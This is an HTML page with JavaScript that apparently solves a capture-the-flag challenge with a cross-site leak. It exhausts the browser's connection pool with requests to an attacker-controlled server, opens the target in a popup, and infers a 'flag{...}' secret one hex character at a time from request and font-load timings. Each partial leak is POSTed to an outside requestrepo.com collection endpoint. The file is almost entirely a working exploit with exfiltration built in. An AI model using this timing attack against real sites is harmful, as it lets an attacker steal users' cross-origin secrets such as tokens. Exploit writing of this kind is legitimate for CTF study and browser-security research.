<textarea id="log" style="width: 100%; height: 300px;"></textarea>
<script>
    SOCKETLIMIT = 255;
    MYSERVER = `...`; // eg. sleep.attacker.com
    TARGET = "http://challenge-01.babelo.xyz/";

    const logtextarea = document.getElementById("log");

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
 
    function tryDecodeHex(hex) {
        try {
            if (!/^[0-9a-fA-F]+$/.test(hex) || hex.length % 2 !== 0) return "";
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return str;
        } catch {
            return "";
        }
    }

    const controllers = [];

    const loadFont = (fontName, fontUrl) => {
        return new Promise((resolve, reject) => {
            const font = new FontFace(fontName, `url(${fontUrl})`);
            font.load().then((loadedFont) => {
                document.fonts.add(loadedFont);
                resolve();
            }).catch(resolve);
        });
    };

    const log = (l, type = 'INFO') => {
        logtextarea.value += `${l}\n`;
        logtextarea.scrollTop = logtextarea.scrollHeight;
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;

        fetch(`http://sleep${i}.${MYSERVER}/360?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }

    const clear_log = () => {
        logtextarea.value = '';
    }

    const fetch_leak = async (qq, threshold) => {
        let start = performance.now();
        await fetch(`http://${qq}FFFFFF.${MYSERVER}/0?q=${qq}`, {
            mode: 'no-cors',
            method: "HEAD"
        });

        log(`fetch_leak(${qq}) took ${performance.now() - start}ms`);

        return performance.now() - start > threshold;
    }

    const block_socket = async (i) => {
        let controller = fetch_sleep_long(i);
        await sleep(0);

        return controller;
    }

    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            let controller = await block_socket(i);
            controllers.push(controller);
        }
    }

    async function measure_fetch_leak() {
        let total = 0;
        let count = 16;
        for (let i = 0; i < count; i++) {
            let start = performance.now();
            let random = Math.random().toString(36).slice(2);
            await fetch(`http://${random}FFFFFF.${MYSERVER}/0?q=${random}`, {
                mode: 'no-cors',
                method: "HEAD"
            });
            let duration = performance.now() - start;
            total += duration;
        }
        let average = total / count;
        log(`Average fetch_leak() duration over ${count} runs: ${average}ms`);
        return average;
    }
    async function measure_fetch_target() {
        let total = 0;
        let count = 16;
        for (let i = 0; i < count; i++) {
            let start = performance.now();
            let random = Math.random().toString(36).slice(2);
            try{
                await fetch(`http://${random}.challenge-01.babelo.xyz/?q=${random}`);
            }catch(e){}
            let duration = performance.now() - start;
            total += duration;
        }
        let average = total / count;
        log(`Average measure_fetch_target() duration over ${count} runs: ${average}ms`);
        return average;
    }
    async function measure_font() {
        let total = 0;
        let count = 8;
        for (let i = 0; i < count; i++) {
            let start = performance.now();
            try {
                await loadFont("testfont", `http://000000.${MYSERVER}/ssleep/250`);
            } catch(e) {}
            let duration = performance.now() - start;
            total += duration;
        }
        let average = total / count;
        log(`Average measure_font() duration over ${count} runs: ${average}ms`);
        return average - average / 10;
    }

    async function test(leak, w, threshold){
        const charset = "0123456789ABCDEF";

        let lo = 0;
        let hi = charset.length - 1;
        let mid;

        while (lo <= hi) {
            let res_blocker_controller = await fetch_sleep_long(1337);
            await sleep(0);

            log("blocked last socket")
            log("changing location")

            // here the cross-origin request is triggered
            w.location = `${TARGET}#b`;
            await sleep(100);

            let midIndex = Math.floor((lo + hi) / 2);
            mid = charset[midIndex];

            let promise1 = fetch_leak(leak + mid, threshold);
            await sleep(100);
            res_blocker_controller.abort();
            let promise2 = loadFont("asdasd", `http://000000.${MYSERVER}/ssleep/250`);

            let is_lower = !(await promise1);
            await promise2

            if (is_lower) {
                lo = midIndex + 1;
            } else {
                hi = midIndex - 1;
            }

            log("changing location again")

            w.location = `${TARGET}#a`;
        }

        mid = charset[lo];

        return mid;
    }


    async function main(){
        let myserver_timing = await measure_fetch_leak();
        let target_timing = await measure_fetch_target();
        let font_timing = await measure_font();

        log(`Threshold: ${myserver_timing + target_timing + font_timing}`);

        await exhaust_sockets()
        let start = performance.now();

        w = window.open(`${TARGET}#a`, "_blank", "width=800,height=600");

        await sleep(100);
        let leak = "666c61677b"; // flag{

        while(!tryDecodeHex(leak).includes("}")){

            log(`Testing for next character... Current leak: ${leak}`);
            let c = await test(leak, w, myserver_timing + target_timing + font_timing);
            if(c){
                leak += c;
            } else{
                leak = leak.slice(0, -1);
            }
            
            clear_log();
            log(`Leaked: ${leak} ${tryDecodeHex(leak)}`);

            await fetch("https://xxxxxxxxxxxxxxxx.requestrepo.com/", {
                body: `${leak}||${tryDecodeHex(leak)}`,
                mode: "no-cors",
                method: "POST"
            })
        }

        log(`Final leak: ${leak}`);
        log(`Time taken: ${(performance.now() - start) / 1000} seconds`);
    }

    main();


</script>
